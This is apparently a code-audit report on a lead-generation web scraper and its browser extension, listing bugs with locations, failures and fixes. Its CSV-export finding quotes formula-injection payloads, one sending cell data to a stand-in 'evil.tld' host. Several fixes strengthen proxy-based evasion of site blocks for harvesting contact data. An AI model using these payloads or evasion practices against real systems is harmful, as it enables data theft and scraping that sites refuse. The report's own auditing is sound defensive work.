### The 7-day HTTP cache covers every stable seed index URL, so a daily run re-reads a week-old snapshot and --only-new produces nothing

`src/leadgen/seed/arbeitnow.py:97` · silent-failure

**What happens.** Both lead configs set `cache_enabled: true` and `cache_ttl_seconds: 604800` (7 days) against a persistent SQLite at `.cache/http_cache.sqlite`. `HttpClient.get` consults that cache before every request (src/job_scraper/http.py:501-504) and seed index URLs are byte-stable across days: arbeitnow's feed is `https://www.arbeitnow.com/api/job-board-api` and its `links.next` chain is `?page=2`..`?page=20`; the Greenhouse/Lever/Personio board URLs are slug-only; the jobs.ch filter URL is fixed once `daily.sh` pins `DAYS=3`; and every Workable page-1 URL is just query+location. So on days 2-7 of a week the seed layer replays identical bodies, `companies_from_listings` yields the same companies, the checkpoint says they are already crawled, and `--only-new` finds nothing new to deliver.

**Failure.** Operator runs `./scripts/daily.sh` (REGION=europe) on Monday: 5,000 arbeitnow rows are fetched and cached. Tuesday through Sunday every one of the 20 arbeitnow page fetches is a cache hit returning Monday's bytes, so the six new days of German postings are never seen. The run reports the same 'seed: N listings total' and then a SHORTFALL, with no log line anywhere saying the data came from cache.

**Fix.** Seed index/listing URLs must bypass the long cache: pass `use_cache=False` (or a short TTL) for the paginated index fetches in arbeitnow.fetch, jobsch._uuids, jobsearch.search_workable/search_smartrecruiters and atsboards fetchers, while keeping the long TTL for per-company detail/homepage fetches, which is what the week-long TTL was actually written for.

### Lever returns an authoritative ISO country on every posting and the seed throws it away, so 63% of Lever companies are dropped by --countries

`src/leadgen/seed/atsboards.py:221` · data-quality

**What happens.** `_lever` builds a JobListing with `location=categories.get("location")` and never sets `country`. Lever's JSON carries a top-level `country` field holding an ISO alpha-2 code on essentially every posting. Because `country` is unset, `jobboard.country_of` (src/leadgen/seed/jobboard.py:125-143) finds no stated code and falls back to `country_from_location()` on free text like "Trento", "Chisinau", "Pisa", "Noida" - none of which are in geo.CITY_NAMES. The company then gets country "" and is removed by the `countries is not None` filter at jobboard.py:162-166 before domain resolution ever runs. The same omission exists for Greenhouse (`_greenhouse` ignores `offices[]`).

**Failure.** `--boards configs/leads/boards.txt --countries eu` against lever slug `ion`: the board has 23 Italian postings. Only the Milan/Rome ones resolve; postings in Trento and Pisa resolve to "". A company whose entire Italian presence is in Trento gets country "" and is silently discarded at jobboard.py:164, even though every one of its postings carries `"country": "IT"`.

**Fix.** In `_lever`, set `country=(item.get("country") or "").strip().upper()`. In `_greenhouse`, fall back through `offices[].name` when `location.name` yields nothing. Both make `country_of` use a stated code rather than a guess.

### Greenhouse hands back the real company name on every job and the seed overwrites it with the board slug, breaking both the deliverable and domain guessing

`src/leadgen/seed/atsboards.py:209` · data-quality

**What happens.** `_greenhouse` sets `company=slug`. The Greenhouse jobs payload contains a `company_name` field on every job object. `CompanyContext.name` is taken straight from `first.company` (jobboard.py, `name=first.company`) and lands in the CSV as `company_name` (src/leadgen/assemble.py:174), so every lead sourced from the 837 Greenhouse boards is delivered under a lowercase punctuation-free slug. Worse, jobboard.py:179 feeds that same slug into `guess_domains`, and Greenhouse slugs routinely carry an account-disambiguation digit, which NXDOMAINs on every TLD and drops the company entirely.

**Failure.** Board `addepar1`: `absolute_url` is `https://job-boards.greenhouse.io/addepar1/...`, which `is_company_site` rejects as an ATS host, so the only hint left is `guess_domains("addepar1", "addepar1", "US")` -> `[]`. `resolve_domain` returns "" and jobboard.py:183 drops Addepar at DEBUG level. Had `company_name="Addepar"` been used, the stem would have been `addepar` and `addepar.com` resolves.

**Fix.** In `_greenhouse`, use `company=(item.get("company_name") or slug).strip()`. Optionally strip trailing account digits from the slug before using it as a domain stem.

### A company whose homepage answers 403 is discarded as 'no own-domain' even when the seed API supplied the exact correct website

`src/leadgen/seed/jobboard.py:181` · anti-bot

**What happens.** `build` collects `company_website` / `apply_url` / `job_url` as hints and calls `resolve_domain`. `resolve_domain` (src/leadgen/company/domain.py:128) only accepts a host if `http.get(probe) is not None`. `HttpClient.get` returns None for 403 (http.py:545-548), for 429 (http.py:540-544), and for anything `_looks_like_block` flags (http.py:558-561). So a WAF on the employer's homepage is treated as proof that the domain does not exist, the company is dropped at jobboard.py:182-184 with a DEBUG-only message, and everything downstream - the person cascade, the ad-mined contacts already in hand - is thrown away with it. The distinction between 'no domain' and 'domain is fine but bot-walled' is exactly the one this pipeline cannot afford to lose.

**Failure.** Workable returns a job at EUROPEAN DYNAMICS with `company.website = "https://eurodyn.com"`. `resolve_domain` probes `https://eurodyn.com/`, receives 403, returns "", and the company is dropped. The log shows only 'seed: N unique companies with a resolved own-domain' with a smaller N and no reason.

**Fix.** When a hint URL is already a stated employer website (as opposed to a guess), accept the registrable host without requiring a 200. Separately, have `resolve_domain` distinguish 'unreachable' from 'blocked' - `http.head` or a status-returning variant - and count blocked-but-real domains in the funnel rather than discarding them, and raise the drop log to INFO with the reason.

### The SmartRecruiters endpoint ignores every pagination parameter, capping that seed at ~98 rows per keyword out of up to 12,915 available, with no shortfall reported

`src/leadgen/seed/jobsearch.py:175` · correctness

**What happens.** `search_smartrecruiters` issues exactly one request per keyword against `https://jobs.smartrecruiters.com/sr-jobs/search?limit=N&keyword=...` and takes `payload["content"]`. That endpoint clamps `limit` to 100 and ignores `offset`, `page` and `pageSize` outright - it returns the identical first 98 rows no matter what is asked. The response's own `totalFound` field states how much was left behind and the code never reads it; the log line prints `len(rows)` (98), which reads like a complete answer. The seed is therefore permanently capped at 55 keywords x ~98 = ~5,400 rows and cannot be scaled by any knob the CLI exposes.

**Failure.** Keyword 'Sviluppatore software' has 12,915 matching postings. The seed takes 98 and logs '  98 jobs'. 99.2% of the source is never seen, and nothing in the run tells the operator that a larger result set existed.

**Fix.** Read and log `totalFound` so the shortfall is visible, and replace the unpaginated `sr-jobs/search` call with `api.smartrecruiters.com/v1/companies/{identifier}/postings?limit=100&offset=N&country=XX`, which honours offset and country - the `company.identifier` needed for it is already in the search response.

### The e2e test's LocalHttp mock encodes the opposite of the production contract, and its docstring claims it is the real code path

`tests/leadgen/test_e2e.py:3` · correctness

**What happens.** The module docstring (lines 3-5) states: "The only thing stubbed is DNS/SMTP. Everything else — HTTP, HTML parsing, the person cascade, pattern inference, scoring, the quota cut and the CSV writer — is the real code path the production run takes." That is false. `LocalHttp` (lines 93-114) is a hand-rolled object that replaces HttpClient entirely: `get()` issues a bare `requests.Session().get()` and returns `(url, text)` on 200, `None` otherwise. It carries no robots check, no 403 branch, no `_looks_like_block`, no cache, no proxy pool, no UA rotation, no per-host throttle, and no `head`/`get_json`/`post_json`. Worse, `test_seed_drops_a_company_whose_own_domain_is_unreachable` (lines 174-183) defines `class Dead: def get(...): return None` and asserts `companies_from_listings(listings, Dead()) == []`. In production `None` from HttpClient.get() means robots-disallowed OR 403 OR 429 OR any 4xx/5xx OR WAF-block OR timeout — overwhelmingly "this company exists and blocked us," not "this company does not exist." The test canonises dropping those companies as correct behaviour.

**Failure.** src/leadgen/company/domain.py:125-131 probes a candidate domain with `if http.get(probe) is not None`. www.sap.com, www.hellofresh.de, www.getyourguide.com and www.zalando.de all answer 403 to a plain request, so `get()` returns None and every one of those employers is discarded at the seed stage as "domain unreachable." The suite asserts this is right. Four of six probed EU company domains vanish before the crawler ever runs, and the green test suite says the seed is working.

**Fix.** Drive the e2e through a real HttpClient pointed at the local server. Add routes that return 403 and a 200-with-challenge, and assert the pipeline records them as BLOCKED rather than as "no such company" / "names nobody". Rewrite `Dead` into two distinct stubs — `NotFound` (404) and `Blocked` (403) — with different expected outcomes.

### 453 tests pass but HttpClient.get() is never called once — 403 handling, block detection, the proxy pool and the response cache have zero coverage

`tests/test_http_retry.py:8` · coverage

**What happens.** The only two HTTP test files construct an HttpClient and then assert on configuration attributes, never on behaviour. tests/test_http_retry.py:12-13 reaches into `client._session.get_adapter(...).max_retries` and asserts on `respect_retry_after_header`, `status_forcelist` and `backoff_max`. tests/test_http_robots.py:27 replaces `client._robots` with a `_DenyAll` stub and then only calls the pure predicate `_robots_allow`. Neither file issues a request. Coverage confirms it: `src/job_scraper/http.py` is at 38% with the missing ranges being 502-574 (the whole body of `get()` — header assembly, the request, the 429 branch, the 403 branch, block detection, the cache write), 465-493 (`_stealth_headers`), 601-612 (`head`), 621-669 (`post_json`), 161-220 (`_ProxyPool.acquire/report_success/report_failure/jar_for`) and 264-319 (`_ResponseCache`). `src/job_scraper/robots.py` is at 31% with `is_allowed` (33-50) and `_fetch` (58-83) entirely uncovered — including the 401/403 -> `disallow_all = True` branch that CHANGELOG.md:76 lists under "Security" and that ONBOARDING.md:355-369 blames for the entire Arbeitsagentur famine.

**Failure.** Change http.py's 403 branch to `return None` for every status >= 200, or delete the `_looks_like_block` call, or make `_ProxyPool.acquire` always return None: all 453 tests still pass. The live failure mode — a company domain answering 403 with a Cloudflare body — has never once been fed through the code that handles it.

**Fix.** Add a test module that drives HttpClient.get() against a local HTTPServer (the machinery already exists in tests/leadgen/test_e2e.py:77-84) with routes returning: 403 + Cloudflare body, 200 + a >5000-char JS challenge, 429 + Retry-After, a genuine 404, and a good page. Assert the return value AND that a distinguishable log line was emitted for each. Add a separate test for robots.RobotsCache._fetch driving a 403 /robots.txt and asserting disallow_all.

### tools/verify_leads.py passes a zero-row CSV, so the delivery gate in both daily scripts green-lights an empty file

`tools/verify_leads.py:37` · silent-failure

**What happens.** Every hard check in verify_leads.py is a per-row aggregation: `missing = sum(1 for row in rows if not ...)` (line 38), `duplicates = len(emails) - len(set(emails))` (line 44), `role_hits = [e for e in emails if ...]` (line 52), `untraceable = sum(...)` (line 57). With `rows == []` all of them are 0, `failures` stays empty, and line 98 prints "All hard guarantees hold." returning 0. `--expect` (line 34) is the only check that could catch it, and neither scripts/daily.sh:160 nor scripts/daily.ps1:173 passes it. docs/ONBOARDING.md:102-105 tells the operator "The script checks its own output before it finishes... If it does not say that, the file is good," and RUNBOOK-leads.md:94 says "Exit code 0 means every hard guarantee holds."

**Failure.** I ran `python tools/verify_leads.py` on the zero-row CSV produced by the RUNBOOK smoke command. Output: `rows: 0 / missing person_name: 0 / ... / All hard guarantees hold.` exit 0. On a bot-walled employee machine the daily run yields 0 rows, exits 2, daily.sh:155 treats 2 as success, runs the verifier, gets exit 0, and prints "Done, but short of 300 rows" — the operator is told the pipeline worked and the market was thin.

**Fix.** Fail when `len(rows) == 0` unconditionally, and have the daily scripts pass `--expect` or at least a `--min-rows 1`. A zero-row delivery is the one output that should never pass a gate whose stated purpose is to stop bad files reaching a buyer.


## HIGH

### README and ARCHITECTURE promise automatic 403/WAF backoff and proxy failover that the code does not implement

`README.md:141` · docs-mismatch

**What happens.** README.md:141 lists under "What you don't have to do": "Manage WAF retries — auto-backoff on 403/captcha", and README.md:331 repeats "WAF / 403 / captcha detection auto-backs off — never hammers." docs/ARCHITECTURE.md:102-105 is more specific: on a WAF hit the client will "Back off with exponential jitter" and "After N failures, route through next proxy." None of that exists. In http.py:576-579 a 403 sets no backoff and returns None immediately; in :590-593 a detected block does the same. `backoff_seconds` is only ever assigned in the 429 branch (:571-575). The urllib3 Retry is configured with `status_forcelist=(500, 502, 503, 504)` — 403 is not retried at any layer, so http.py's own module docstring line 10 ("WAF / 403 / captcha detection — short-circuits to retry layer") is also false. And `report_failure(None)` is a no-op (:202-204), so with the shipped configs — where `proxies` is empty everywhere except an empty list in jobsch.yaml:15 — a 403 produces literally nothing: no retry, no sleep, no proxy rotation, and no log above DEBUG.

**Failure.** An operator reads README.md:141, configures nothing extra, and runs against EU company domains. Every 403 is dropped in silence. Reading the INFO-level log afterwards they see no 403s at all, conclude the sites simply had no team pages, and follow RUNBOOK:140-143 into the parser.

**Fix.** Either implement it (escalate 403/challenge through the transport ladder that now exists in src/job_scraper/transport.py, and log each block at INFO with host and outcome), or strike the three claims. At minimum, log 403 and block detections at INFO so the failure is visible.

### README documents socks5:// proxies but PySocks is in neither requirements.txt nor pyproject, and the failure is invisible at default log level

`README.md:174` · silent-failure

**What happens.** README.md:171-178's config reference shows `proxies:` with a `"socks5://host:port"` entry, and src/job_scraper/config.py:55-56 documents the same format. `requests` only supports socks:// schemes when PySocks is installed, which it pulls in via the optional `requests[socks]` extra. Neither requirements.txt (10 lines, no PySocks) nor pyproject.toml's `dependencies` (lines 26-36) declares it, so a venv built by scripts/setup.sh:35 or setup.ps1:47 will not have it. When it is absent, `requests` raises `InvalidSchema("Missing dependencies for SOCKS support")`, a subclass of `RequestException`, which http.py:566-570 catches and handles with `logging.debug(...)`, `report_failure`, `return None`.

**Failure.** An operator follows the user's own plan — fetch proxies, configure them — and lists socks5 entries. Every request through every proxy fails. At default INFO level nothing is printed except, eventually, the single `all N proxies are cooling down ... falling back to a DIRECT connection` warning from http.py:188-192. The run then proceeds entirely on the real IP, which is the exact outcome the proxies were added to prevent, and the log says the proxies "cooled down" — suggesting they were tried and were slow, not that they were never usable.

**Fix.** Add `PySocks>=1.7.1` (or depend on `requests[socks]`) to requirements.txt and pyproject dependencies. Separately, catch `requests.exceptions.InvalidSchema` explicitly in http.py and raise it at startup with the actionable message, rather than folding a permanent configuration error into the transient-failure path.

### --search-locations / CITIES=1 triples the request count for a result set that is a strict subset of the country queries

`configs/leads/locations-eu.txt:3` · perf

**What happens.** The city list exists on the stated premise that 'each query is capped at a few hundred results, so a "Germany" sweep returns the same large employers over and over while a Munich Mittelstand firm never surfaces'. That premise is false for the Workable endpoint this seed actually uses: country queries return small totals that `--search-max-pages 3` exhausts completely, and city queries return a strict subset of the country's postings. Passing the 96-line city file instead of the 32 country names therefore triples the request volume - straight through the documented block threshold - for exactly zero additional postings.

**Failure.** Operator sets `CITIES=1` to increase volume. The run makes 4,992 page-1 requests instead of 1,664, gets itself blocked partway through, and harvests fewer postings than the cheaper country sweep would have.

**Fix.** Drop the city list from the Workable path (or gate it on `totalSize == max_pages * 20`, i.e. only when the country query actually saturates). Correct the rationale comment in locations-eu.txt and the `--search-locations` help text in cli.py.

### ONBOARDING's one inviolable rule names a checkpoint file that does not exist, and so does its inspection command

`docs/ONBOARDING.md:162` · docs-mismatch

**What happens.** ONBOARDING.md:160-172 is headed "## The one rule" and says in bold "**Never delete `.cache/daily.sqlite`.**" No such file is ever created. scripts/daily.sh:78 writes `$ROOT/.cache/daily-$REGION.sqlite` and scripts/daily.ps1:90 writes `.cache/daily-$Region.sqlite`, i.e. `.cache/daily-ch.sqlite` and `.cache/daily-europe.sqlite` — which the same document states correctly 74 lines earlier at :88-89. The error repeats at :406 in the diagnostics section: `python tools/inspect_checkpoint.py .cache/daily.sqlite`. tools/inspect_checkpoint.py:32 constructs `Checkpoint(args.path)` and src/leadgen/checkpoint.py:43-47 creates the parent directory and the schema on a missing path, so that command does not error — it creates an empty database and reports zeros.

**Failure.** An operator worried about their history runs the documented inspection command. It prints `leads banked: 0 / with an email: 0 / DELIVERABLE: 0 / companies crawled: 0` and silently creates a stray `.cache/daily.sqlite`. They conclude the memory has been lost and, following the emphasis of "The one rule", may start over — re-crawling everything and re-sending every lead already delivered, which is the precise disaster the section exists to prevent.

**Fix.** Correct both references to `.cache/daily-ch.sqlite` / `.cache/daily-europe.sqlite`. Make tools/inspect_checkpoint.py refuse a path that does not already exist rather than creating one, so a typo reports "no such checkpoint" instead of "your checkpoint is empty".

### OPERATOR-TERMS forbids three things the shipped configs and the RUNBOOK actively instruct operators to do

`docs/OPERATOR-TERMS.md:43` · docs-mismatch

**What happens.** docs/OPERATOR-TERMS.md is the document ONBOARDING.md:10 tells every employee to read first, and three of its rules are contradicted by the shipped repo. (1) Line 43-44: "it honours robots.txt, throttles per host, and identifies itself." It does not identify itself: `rotate_user_agents` defaults True (config.py:54) and is set true in every shipped config; HttpClient._pick_ua returns a random Chrome/Firefox/Safari string and `_stealth_headers` adds matching Sec-CH-UA hints. Worse, `_robots_allow` evaluates robots.txt against `self.user_agent` ("HarvestKitBot/1.0") while the wire request claims to be Chrome — the tool claims robots compliance under a name it never sends. (2) Line 47: "**Never set `obey_robots: false`.** There is exactly one legitimate exception... Nothing else qualifies." Nine shipped configs set it false: germany.yaml:6, norway-big.yaml:5, norway-it.yaml:9, norway-top5.yaml:17, finn.yaml:5, jobsch.yaml:5, karrierestart.yaml:4, nav.yaml:4, general.example.yaml:10 — and configs/leads/eu-it.yaml:36 plus ONBOARDING.md:371-372 explicitly instruct the operator to set it false. (3) Line 52: "Do not raise `concurrency` past 8" — RUNBOOK-leads.md:57 ships `--concurrency 16` and line 225 ships `--concurrency 12` as the recommended commands.

**Failure.** An employee reads OPERATOR-TERMS, then follows RUNBOOK-leads.md:53-57 verbatim and runs at --concurrency 16 while believing they are within the rules. Or they open configs/sites/jobsch.yaml, see obey_robots: false, and conclude the written rule is decoration — which is how every other rule in that document loses force.

**Fix.** Pick one. Either the terms are the policy (then fix the nine configs, lower the RUNBOOK commands to 8, and either stop rotating UAs or stop claiming the tool identifies itself), or the configs are the policy (then rewrite the terms to describe what actually ships). A compliance document contradicted by the code it governs is worse than none.

### Every posting is written twice: the card snapshot and the deep-scrape result get different fingerprints and are never merged

`extension/app/src/background/main.ts:179` · data-quality

**What happens.** FULL_SCRAPE_ACTIVE step 3 saves one row per card built from {card title, card company, card location, card url} with source_ats='full-pipeline' and confidence 0.50. Step 4 then deep-crawls the same URLs; runCrawl (bulk.ts:168) saves a SECOND row built from {cleanTitle(og:title), og:site_name company, JSON-LD location, bestApplyUrl()}. Those four inputs differ, so fingerprint() differs, so db.jobs.put() creates a new row instead of replacing the stub. The Python engine has JobListing.merge() specifically to "fold a deep-scrape result into a listing stub"; the extension has mergeJobs() in schema.ts but never calls it across DB writes.

**Failure.** Scrape 25 stepstone cards with the full pipeline: the library ends with ~50 rows — 25 near-empty confidence-0.50 stubs and 25 deep rows — and the CSV the operator sends to the client is half junk.

**Fix.** Before db.jobs.put in bulk.ts, look up the existing row by the stub's fingerprint (carry the stub id through the crawl as a hint), and when found use mergeJobs([existing, fresh]) + delete the stale key. Port _FIRST_WINS_FIELDS into mergeJobs at the same time (see separate finding).

### Paginator.scrollAndWait() returns true unconditionally, so infinite-scroll pagination never terminates early and repeats up to 100 identical passes

`extension/app/src/content/paginator.ts:200` · correctness

**What happens.** scrollAndWait returns `scrollHeight > before || document.querySelectorAll('a[href]').length > 0`. The second operand is true on literally any page that contains one link, so the 'did new content load?' check is dead — advance() always reports success. Compounding it, detectInfiniteScroll() (line 116) returns true whenever scrollHeight > innerHeight*3, which is true of nearly every list page. So detectPagination almost never returns 'none', and collectAll runs its full maxPages budget — 100 in runPaginatedScrape (inject.tsx:190) — at scrollDelayMs 2000 + delayMs 1800 per iteration. collectAll also has no "0 new cards for N pages" early exit.

**Failure.** Operator clicks "Scrape ALL pages" on a tall list page that has ordinary numbered pagination but whose Next button sits outside PAGINATION_SEL. detectPagination falls through to infinite-scroll, scrollAndWait always returns true, and the content script scrolls and re-extracts the same 25 cards 100 times — roughly 6.3 minutes of page thrash — before reporting 25 jobs.

**Fix.** Make scrollAndWait return only `document.documentElement.scrollHeight > before` (optionally OR a card-count increase measured by the caller). Require detectInfiniteScroll to see a real sentinel/observer rather than mere page height. Add a consecutive-zero-new-cards counter to collectAll and break after 2.

### genericListExtract accepts EVERY anchor on "aggregator" hosts, turning nav/footer links into saved jobs and crawl targets

`extension/app/src/content/sites/index.ts:336` · data-quality

**What happens.** When isAggregator is true the HREF_RX job-path filter is skipped entirely (line 336) and the TITLE_RX job-word filter is skipped too (line 344). Every anchor that is not '#' or javascript: becomes a ListCard. These cards are saved to db.jobs via SAVE_LIST/FULL_SCRAPE with confidence 0.50 AND handed to startCrawlRun, so each one costs a real background tab. AGGREGATOR_RX is also matched unanchored against the hostname, so substrings like 'dice', 'builtin' and 'jobs.de' classify unrelated hosts as aggregators; and two of its alternatives ('linkedin.*\/jobs', 'xing\.com\/jobs') contain a slash and therefore can never match a hostname at all.

**Failure.** On indeed.de the adapter selectors miss (Indeed rotates data-testid values), so listCards() falls through to genericListExtract with isAggregator=true. It returns ~180 cards: 'Impressum', 'Datenschutz', 'Deutsch', 'Arbeitgeber', cookie-policy links and the actual jobs. All 180 are saved as jobs and 180 tabs are opened to deep-crawl them.

**Fix.** Never drop the HREF_RX filter outright. On aggregator hosts, relax it to a wider job-path set plus a requirement that the anchor sit inside a repeated structural group (smartDetector.findRepeatedGroups already computes this). Anchor AGGREGATOR_RX with (^|\.)host$ alternatives and delete the two path-bearing alternatives that can never match.

### Swiss and Nordic salaries are parsed wrong or dropped: no apostrophe thousands separator, no CHF/SEK/NOK currency, k-suffix ignored, hourly rates labelled yearly

`extension/app/src/content/strategies/heuristics.ts:36` · data-quality

**What happens.** The extension's SALARY_RX is a stripped-down copy of the Python one. Python's _NUM allows apostrophe and narrow-no-break-space separators, supports CHF/Fr./SFr./PLN/CZK/HUF, handles 'pro/par/al' and 'p.a./jährlich/monatlich/heure/ora', and normalises via _normalize_amount(). The extension's version (a) has no apostrophe in the separator class, (b) matches CHF/SEK/DKK/NOK in the pattern but never assigns them in the currency branch (only EUR/USD/GBP), (c) captures the k/tausend/thousand suffix as a non-capturing group and never applies the x1000 multiplier, and (d) maps every non-month period to 'year', so an hourly rate is recorded as annual.

**Failure.** jobs.ch — the repo's flagship Swiss target — renders "CHF 80'000 - 110'000 / Jahr". The extension stores salary_min="80", salary_max="", salary_currency="". Every Swiss salary in the library is off by a factor of 1000 with no currency, while the CLI records it correctly, so the two exports cannot be concatenated meaningfully.

**Fix.** Port Python's SALARY_RX and _normalize_amount() to TypeScript verbatim (including the ' and    separators and the full currency/period alternation), assign CHF/SEK/DKK/NOK/PLN/CZK/HUF in the currency branch, add the 'hour' period, and apply the k/tausend multiplier.

### Phone regex truncates Swiss/Norwegian numbers and accepts dates and reference IDs as phone numbers — Python already fixed both

`extension/app/src/content/strategies/heuristics.ts:38` · data-quality

**What happens.** The extension's PHONE_RX allows exactly three digit groups after the optional country code. src/job_scraper/extract.py:1100 allows 1-5 groups with the explicit comment: "Three groups was too few for Norwegian (95 83 21 97) and Swiss (44 215 15 78) numbers — they came out truncated". The extension also filters only on `digits >= 7`, whereas Python rejects <8/>15 digits, bare 9-12-digit runs (reference IDs), and DATE_LIKE_RX strings. The same truncating regex is copy-pasted into generalExtract.ts:108 and jsonld.ts:15.

**Failure.** A German posting containing the application deadline "15.01.2024" and no phone number at all is exported with application_phone="15.01.2024". A Swiss posting listing "+41 44 215 15 78" exports "+41 44 215 15" — an unreachable number. The operator dials garbage.

**Fix.** Replace PHONE_RX with the Python 1-5-group version in all three files, and port the Python rejection filter (8-15 digits, no bare 9-12-digit runs, no DATE_LIKE_RX matches).

### company column gets the job board's name, not the employer, because fromOpenGraph writes og:site_name into company

`extension/app/src/content/strategies/opengraph.ts:24` · data-quality

**What happens.** fromOpenGraph sets job.company = og:site_name. On an aggregator that tag is the BOARD ('StepStone', 'jobs.ch', 'Indeed'), not the hiring company. Because mergeJobs is longest-wins and the opengraph part is merged after the jsonld part, any site_name longer than the real employer name overwrites it. company is also one of the four fingerprint inputs, so this both corrupts the lead and changes the id.

**Failure.** A stepstone.de posting whose JSON-LD hiringOrganization.name is 'SAP SE' (6 chars) gets og:site_name 'StepStone' (9 chars). mergeJobs overwrites company with 'StepStone'. Every lead exported from that board is attributed to the board.

**Fix.** Do not write og:site_name into `company` at all — it is only safe as a title-cleaning hint (it is already passed to cleanTitle). If a fallback is wanted, gate it: only set company from site_name when no JSON-LD/microdata hiringOrganization was found AND the host is not in AGGREGATOR_RX.

### CSV export does not neutralise formula injection — scraped page text executes in Excel/Sheets

`extension/app/src/lib/export.ts:32` · security

**What happens.** csvCell only doubles quotes and flattens newlines. A cell whose value begins with =, +, -, @, TAB or CR is interpreted as a formula by Excel, LibreOffice and Google Sheets. Every value in these rows is attacker-controlled: it comes from job titles, company names and descriptions on arbitrary third-party pages. (The Python exporter, src/job_scraper/export/csv_exporter.py:34, uses a bare csv.DictWriter and has the same gap, so this must be fixed on both sides.)

**Failure.** A job board serves a posting titled `=HYPERLINK("https://evil.tld/?d="&A2,"Open role")`. It is scraped, exported, and the operator opens jobharvester-*.csv in Excel; the cell renders as a benign link that exfiltrates the neighbouring cell's contents on click. The older DDE vector (`=cmd|'/c calc'!A1`) still fires on unpatched Office installs.

**Fix.** In csvCell, when the flattened value's first character is one of = + - @ \t \r, prefix a single apostrophe (or a zero-width-safe TAB) before quoting. Apply the same guard in src/job_scraper/export/csv_exporter.py. Also flatten a lone \r: the current /\r?\n/ does not match a bare carriage return.

### mergeJobs uses longest-string-wins for every field, including dates, IDs, URLs and salaries — the exact bug Python fixed with _FIRST_WINS_FIELDS

`extension/app/src/lib/schema.ts:68` · data-quality

**What happens.** mergeJobs() overwrites a field whenever a later strategy supplies a longer string, with no exclusion list. src/job_scraper/models.py defines _FIRST_WINS_FIELDS (24 fields: posted_date, valid_through, start_date, scraped_at, salary_min/max/currency/period, external_id, requisition_id, source_ats, source_domain, confidence, apply_url, job_url, company_website, company_logo, recruiter_email/phone/linkedin, application_email/phone, hiring_manager_email) with the comment "longer is meaningless there and actively harmful — it lets a prose sentence overwrite an ISO date". The extension has no such guard, so the heuristics pass (which runs AFTER jsonld) can clobber authoritative structured values with regex noise.

**Failure.** JSON-LD gives salary_min='65000'. The heuristics pass regexes a benefits line '€ 1.500 Weiterbildungsbudget' out of the page body and produces salary_min='1500' — 4 chars vs 5, so it does not win. But posted_date='2026-05-01' (10 chars) loses to microdata's <time datetime='2026-05-01T09:00:00+02:00'> (25 chars), and apply_url loses to whichever candidate happens to carry the longest query string rather than the ATS one bestApplyUrl chose.

**Fix.** Copy _FIRST_WINS_FIELDS verbatim into schema.ts and apply the same predicate in mergeJobs (and mergeRecords in generalSchema.ts, which has the identical gap against general_scraper/models.py's own _FIRST_WINS_FIELDS).

### The Windows daily script defaults SMTP probing ON while the bash one defaults it OFF, and ONBOARDING documents the bash default backwards

`scripts/daily.ps1:71` · correctness

**What happens.** scripts/daily.sh:58 sets `NO_SMTP="${NO_SMTP:-1}"` and line 138 appends `--no-smtp` by default — mailbox probing is skipped unless the operator opts in. scripts/daily.ps1:71 declares `[switch] $NoSmtp`, which defaults to `$false`, so line 153 appends nothing and probing runs by default. The two platforms ship opposite defaults for the same operation, and the ps1's own comment at lines 69-70 repeats the bash rationale ("Required wherever outbound port 25 is blocked, which is most home and office networks and every major cloud provider") while defaulting it off. docs/ONBOARDING.md:273 then documents it wrongly for both: `| -NoSmtp | NO_SMTP=1 | off | ...` states the default is "off", which is right for PowerShell and wrong for bash — and ONBOARDING.md:63 says the opposite in prose ("leave NO_SMTP=1 (default elsewhere)").

**Failure.** A Windows employee runs `.\scripts\daily.ps1` exactly as ONBOARDING.md:77 instructs. Port 25 is blocked (ONBOARDING.md:65 says this is the normal case). src/leadgen/email/validate.py catch-all probing attempts an SMTP connection per domain and times out on each, adding minutes of dead wait across thousands of companies, and every row lands `unknown` instead of `inferred_*`. Meanwhile the macOS/Linux command shown at ONBOARDING.md:84 is `NO_SMTP=0 ./scripts/daily.sh` — explicitly turning probing ON for the platform where it defaults off.

**Fix.** Make the Windows default match: `[bool] $NoSmtp = $true` with an explicit `-NoSmtp:$false` opt-out, or have setup.ps1 write the detected value into a config the daily script reads. Fix ONBOARDING.md:273 to state `on (bash) / off (PowerShell)` or, once unified, the single true default.

### setup.sh aborts with no message whenever the smoke harvest falls short, because pipefail turns exit-2 into a fatal error

`scripts/setup.sh:70` · correctness

**What happens.** setup.sh sets `set -euo pipefail` at line 13. Line 70 runs `"$PYTHON" "${args[@]}" 2>&1 | grep -v "WARNING Retrying" | tail -12`. With pipefail the pipeline's status is the rightmost non-zero, and src/leadgen/cli.py:431 returns 2 on SHORTFALL. So a smoke run that finds fewer than 10 leads makes the pipeline exit 2, `set -e` fires, and the script dies at line 70 — before the friendly "Smoke run produced no file" check on line 71, before the verifier on line 72, and before the "Setup complete." block on lines 76-82. The same command in scripts/daily.sh:149-152 is written correctly with `set +e` and `${PIPESTATUS[0]}`, so the two scripts disagree about how to handle the product's own documented exit code. A secondary path: if run_leads.py produces no output at all, `grep -v` returns 1 and pipefail kills the script the same way.

**Failure.** A new employee runs ./scripts/setup.sh on a healthy machine. `--jobsch-pages 2 --target 10` (line 66-68) finds 7 leads. run_leads exits 2. The script terminates silently with status 2 immediately after printing the tail of the log. The employee sees neither "Setup complete." nor an error, and docs/ONBOARDING.md:47-48 promised "either `Setup complete.` or a specific error. There is no ambiguous middle."

**Fix.** Mirror daily.sh: wrap the run in `set +e` / `set -e` and read `${PIPESTATUS[0]}`, treating 0 and 2 as success. Drop the `grep -v` or append `|| true` to it.

### The general scraper cannot use proxies at all — and a `proxies:` key in a general config is a hard config error

`src/general_scraper/main.py:74` · anti-bot

**What happens.** `HttpClient(...)` is constructed with seven kwargs and no `proxies`, `proxy_rotation`, `proxy_max_failures` or `proxy_cooldown_seconds`. `GeneralRunConfig` has no proxy fields either, and `general_scraper.config._build` rejects unknown keys, so an operator who adds proxies to a general config gets a startup failure instead of protection. General mode also drives `PlaywrightFetcher`, which (see the separate finding) has no proxy support either — so general mode is 100% direct-IP by construction.

**Failure.** The operator scrapes European business directories in general mode from employee laptops. Every request comes from the employee's residential IP; after a few hundred detail pages the directory rate-limits or bans that IP, and the employee's normal browsing on that site breaks too. There is no configuration that can prevent it.

**Fix.** Add `proxies`, `proxies_file`, `proxy_rotation`, `proxy_max_failures`, `proxy_cooldown_seconds` to `GeneralRunConfig`, reuse `job_scraper.config._load_proxies` for the file merge, and pass them through to `HttpClient`. Share one `RunConfig` proxy block between both modes rather than duplicating it.

### Hostname dispatch uses substring matching, so lookalike and attacker-controlled hosts are routed to ATS adapters

`src/job_scraper/adapters/__init__.py:56` · security

